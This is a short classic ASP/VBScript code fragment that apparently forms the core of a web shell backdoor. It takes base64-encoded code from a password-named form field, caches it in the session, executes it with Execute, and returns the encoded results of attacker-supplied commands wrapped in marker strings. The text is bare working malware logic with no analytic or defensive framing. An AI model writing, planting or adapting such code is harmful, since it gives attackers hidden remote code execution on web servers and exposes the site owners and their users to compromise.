mxData = Request.Form(mxPass)

If Len(mxData) > 0 Then
    If IsEmpty(Session("payload")) Then
        Session("payload") = MxToText(MxB64Decode(mxData))
    Else
        Execute(Session("payload"))
        Response.Write "371be1"
        Response.Write MxB64Encode(run(MxB64Decode(mxData)))
        Response.Write "279ab2"
    End If
End If
